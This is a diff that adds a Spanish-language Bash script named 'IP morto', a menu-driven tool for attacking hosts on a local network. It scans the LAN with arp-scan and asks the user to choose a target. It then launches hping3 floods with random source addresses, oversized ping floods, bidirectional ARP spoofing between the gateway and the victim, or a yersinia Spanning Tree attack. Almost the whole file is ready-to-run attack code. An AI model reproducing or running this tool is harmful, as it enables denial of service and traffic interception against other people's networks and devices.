@@ -1,0 +1,208 @@
+#! /bin/bash
+
+# Este script esta creado por aka-kuro
+#
+#################################################################
+#                                                               #
+# # -*- ENCODING: UTF-8 -*-                                     #
+# Este programa es software libre. Puede redistribuirlo y/o     #
+# modificarlo bajo los términos de la Licencia Pública General  #
+# de GNU según es publicada por la Free Software Foundation,    #
+# bien de la versión 3 de dicha Licencia o bien (según su       #
+# elección) de cualquier versión posterior.                     #
+#                                                               #
+# Si usted hace alguna modificación en esta aplicación,         #
+# deberá siempre mencionar al autor original de la misma.       #
+#                                                               #
+#################################################################
+
+rm -R /tmp/ip_morto 2>/dev/null 
+mkdir /tmp/ip_morto 2>/dev/null 
+
+
+Titulo(){
+	
+clear
+echo -e "\e[0;31m
+ _________ _______    _______  _______  _______ _________ _______ 
+ \__   __/(  ____ )  (       )(  ___  )(  ____ )\__   __/(  ___  )
+    ) (   | (    )|  | () () || (   ) || (    )|   ) (   | (   ) |
+    | |   | (____)|  | || || || |   | || (____)|   | |   | |   | |
+    | |   |  _____)  | |(_)| || |   | ||     __)   | |   | |   | |
+    | |   | (        | |   | || |   | || (\ (      | |   | |   | |
+ ___) (___| )        | )   ( || (___) || ) \ \__   | |   | (___) |
+ \_______/|/         |/     \|(_______)|/   \__/   )_(   (_______)
+                                                                 
+"
+echo 
+tput sgr0
+sleep 0.5
+
+}
+
+Comprobacion(){
+	
+echo -en "\e[0;32m hping3....."
+if ! hash hping3 2>/dev/null ; then
+	echo -e "\e[0;37m No esta instalado"
+	exit 0
+else
+	echo -e "\e[0;37m Esta instalado"
+fi
+sleep 0.2
+
+echo -en "\e[0;32m ping....."
+if ! hash ping 2>/dev/null ; then
+	echo -e "\e[0;37m No esta instalado"
+	exit 0
+else
+	echo -e "\e[0;37m Esta instalado"
+fi
+sleep 0.2
+
+echo -en "\e[0;32m arp-scan....."
+if ! hash arp-scan 2>/dev/null ; then
+	echo -e "\e[0;37m No esta instalado"
+	exit 0
+else
+	echo -e "\e[0;37m Esta instalado"
+fi
+sleep 0.2
+
+echo -en "\e[0;32m arpspoof....."
+if ! hash arpspoof 2>/dev/null ; then
+	echo -e "\e[0;37m No esta instalado"
+	exit 0
+else
+	echo -e "\e[0;37m Esta instalado"
+fi
+sleep 0.2
+
+echo -en "\e[0;32m yersinia....."
+if ! hash yersinia 2>/dev/null ; then
+	echo -e "\e[0;37m No esta instalado"
+	exit 0
+else
+	echo -e "\e[0;37m Esta instalado"
+fi
+sleep 0.2
+
+echo
+echo -en "\e[0;32m Escriba .exit para salir del programa"
+echo 
+echo -en "\e[0;32m Si desa repetir la busqueda escriba .repit"
+echo
+echo -en "\e[0;32m Presione enter para continuar " && read enter
+
+case $enter in
+	.exit) echo; echo " Saliendo del programa"; sleep 03; clear; exit 0;;
+esac
+
+}
+
+Interfaz(){
+
+clear
+Titulo
+
+rm -rf /tmp/ip_morto/Interfaz 2>/dev/null
+
+Inter=$( ip link show | grep ^[0-9] | grep -v lo | cut -f2 -d":"| sed 's/^[ \t]*//' >> /tmp/ip_morto/Interfaz 2>/dev/null )
+
+count=0 
+while read Inter; do 
+	count=$((++count)) 
+	echo -e "\e[0;31m $count \e[0;37m $Inter" 
+done < /tmp/ip_morto/Interfaz
+
+echo
+echo -en "\e[0;32m Seleccione el numero de la interfaz a auditar\e[0;31m => " && read interfaz
+
+case $interfaz in
+	[1-2]) INTER=$( head -$interfaz /tmp/ip_morto/Interfaz | tail -1 ); echo; echo  " A seleccionado $INTER"; sleep 02; clear; Titulo; Busqueda;;
+	.exit) echo; echo " Saliendo del programa"; sleep 03; clear; exit 0;;
+	*[^$count]*|"") echo  "Ingrese un formato válido! Sólo los números que salen listados!"; sleep 03; clear, Titulo; Interfaz;;
+esac
+
+}
+
+Busqueda(){
+	
+rm -rf /tmp/ip_morto/scan 2>/dev/null 
+
+echo " Buscando conexiones puede tardar un poco"
+
+arp-scan --interface=$INTER --localnet 2>/dev/null >> /tmp/ip_morto/scan
+
+Objetivos
+}
+
+Objetivos(){
+
+clear
+Titulo
+
+rm -rf /tmp/ip_morto/objetivos 2>/dev/null 
+
+sed -e '1,2d' -e '/packets/d' -e '/Ending/d' -e '/^$/d' /tmp/ip_morto/scan >> /tmp/ip_morto/objetivos
+obj=$( cat /tmp/ip_morto/objetivos )
+
+if [ -s /tmp/ip_morto/objetivos ]; then
+		count=0 
+	while read obj; do 
+		count=$((++count)) 
+		echo -e "\e[0;31m $count \e[0;37m $obj" 
+	done < /tmp/ip_morto/objetivos
+else
+	echo -en " La interfaz seleccionada no esta conectada, o da un error. Repita el proceso "
+	sleep 03
+	clear
+	Titulo
+	Interfaz
+fi
+
+echo
+echo -en "\e[0;32m Seleccione el objetivo a atacar\e[0;31m => " && read objetivo
+
+
+case $objetivo in
+	[1-99]) obje=$( head -$objetivo /tmp/ip_morto/objetivos | tail -1 ); echo; echo " A seleccionado $obje"; sleep 02; clear; Titulo; Ataque;;
+	.exit) echo; echo " Saliendo del programa"; sleep 03; clear; exit 0;;
+	.repit) clear; Titulo; Busqueda; Objetivos;;
+	*[^$count]*|"") echo  "Ingrese un formato válido! Sólo los números que salen listados!"; sleep 03; clear; Titulo; Objetivos;;
+esac
+
+}
+
+Ataque(){
+
+IP=$( head -$objetivo /tmp/ip_morto/objetivos | tail -1 | awk '{ print $1 }' )
+Gate=$( ip route show | grep default | awk {'print $3'} )
+INTER=$( head -$interfaz /tmp/ip_morto/Interfaz | tail -1 )
+MAC=$( head -$objetivo /tmp/ip_morto/objetivos | tail -1 | awk '{ print $2 }' )
+
+echo -en " 1) \e[0;32m Hping3"
+echo
+echo -en " 2) \e[0;32m Ping"
+echo
+echo -en " 3) \e[0;32m Arp Spoof (efectivo)"
+echo
+echo -en " 4) \e[0;32m Spanning Tree Protocol (efectivo)"
+echo
+echo
+echo -en "\e[0;32m Seleccione el metodo de ataque\e[0;31m => " && read objetivo
+
+case $objetivo in
+	1) hping3 --flood --rand-source $IP & sleep 02 & hping3 --flood --rand-source $IP & sleep 02 & hping3 --flood --rand-source $IP & sleep 02 & hping3 --flood --rand-source $IP; sleep 03; clear; Titulo; Ataque;;
+	2) ping $IP -t -l 15000; sleep 03; clear; Titulo; Ataque;;
+	3) xterm -e arpspoof -i $INTER -t $Gate $IP & sleep 05 & xterm -e arpspoof -i $INTER -t $IP $Gate; sleep 03; clear; Titulo; Ataque;;
+	4) yersinia  stp -attack 3 -interface $INTER -source $MAC; sleep 03; clear; Titulo; Ataque;;
+	.exit) echo; echo " Saliendo del programa"; sleep 03; clear; exit 0;;
+	*[^$count]*|"") echo  "Ingrese un formato válido! Sólo los números que salen listados!"; sleep 03; clear; Titulo; Ataque;;
+esac
+
+}
+
+Titulo
+Comprobacion
+Interfaz
